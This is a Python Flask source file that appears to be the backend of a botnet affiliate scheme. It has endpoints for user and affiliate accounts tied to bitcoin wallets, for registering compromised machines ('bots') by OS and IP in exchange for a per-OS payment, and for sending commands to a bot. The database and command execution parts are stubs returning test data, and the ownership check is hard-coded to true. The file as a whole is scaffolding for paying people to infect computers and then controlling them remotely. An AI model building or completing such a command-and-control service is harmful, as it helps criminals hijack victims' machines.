# imports
from __main__ import app, token_required, BOT_PRICE_LINUX_WINDOWS, BOT_PRICE_MACOS#, mysql
from flask import jsonify, request
import ipaddress


# GET user information
@app.route('/api/users/<int:user_id>', methods=['GET'])
@token_required
def get_user(session_data, user_id):
    # ensure user is authorized to access the information
    if (not session_data['is_staff']) and (session_data['user_id'] != user_id):
        return jsonify({'message': 'You do not have permission to access this information'}), 403
    
    # get user information
    # insert MySQL query here, return test data for the moment
    user_data = {"user_id": 123, "email": "johndoe@example.com", "username": "johndoe", "blocked": False, "bitcoin_wallet": "0x1234567890abcdef"}

    if not user_data:
        return jsonify({'message': 'User not found'}), 404

    return jsonify(user_data), 200


# GET affiliate information
@app.route('/api/affiliates/<int:affiliate_id>', methods=['GET'])
@token_required
def get_affiliate(session_data, affiliate_id):
    # get user_id from affiliate_id
    # insert MySQL query here, return test data for the moment
    user_id = 123

    # ensure user is authorized to access the information
    if (not session_data['is_staff']) and (session_data['user_id'] != user_id):
        return jsonify({'message': 'You do not have permission to access this information'}), 403
    
    # get affiliate information
    # insert MySQL query here, return test data for the moment
    affiliate_data = {"affiliate_id": affiliate_id, "user_id": user_id, "total_bots_added": 10, "money_received": 100.0}

    if not affiliate_data:
        return jsonify({'message': 'Affiliate not found'}), 404

    return jsonify(affiliate_data), 200
    

# POST add a bot as an affiliate
@app.route('/api/bots', methods=['POST'])
@token_required
def post_add_bot(session_data):
    # ensure needed parameters are present
    if (request.json is None) or ('os' not in request.json) or ('ip_address' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    os = request.json['os']
    ip_address = request.json['ip_address']

    # ensure parameters are strings
    if type(os) is not str or type(ip_address) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    
    # validate os
    if os not in ['Windows', 'Linux', 'MacOS']:
        return jsonify({'message': 'Invalid OS'}), 400
    
    # validate ip_address
    try:
        ipaddress.ip_address(ip_address)
    except ValueError:
        return jsonify({'message': 'Invalid IP address'}), 400
    
    # add bot to database
    # update affiliate information
    # insert MySQL query here, return test data for the moment
    response = {"bot_id": 123, "payment": BOT_PRICE_LINUX_WINDOWS if os!='MacOS' else BOT_PRICE_MACOS}
    
    return jsonify(response), 200


# POST send a command to a botnet
@app.route('/api/bots/command', methods=['POST'])
@token_required
def post_send_command(session_data):
    # ensure needed parameters are present
    if (request.json is None) or ('bot_id' not in request.json) or ('command' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    bot_id = request.json['bot_id']
    command = request.json['command']

    # ensure parameters are correct
    if type(bot_id) is not int or type(command) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    
    # ensure user is authorized to access the information because they are the owner of the bot
    # insert MySQL query here, return test data for the moment
    authorized = True

    if not authorized:
        return jsonify({'message': 'You do not have permission to access this information'}), 403
    
    # send command to bot
    "lol"
    response = {"output": "root"}

    return jsonify(response), 200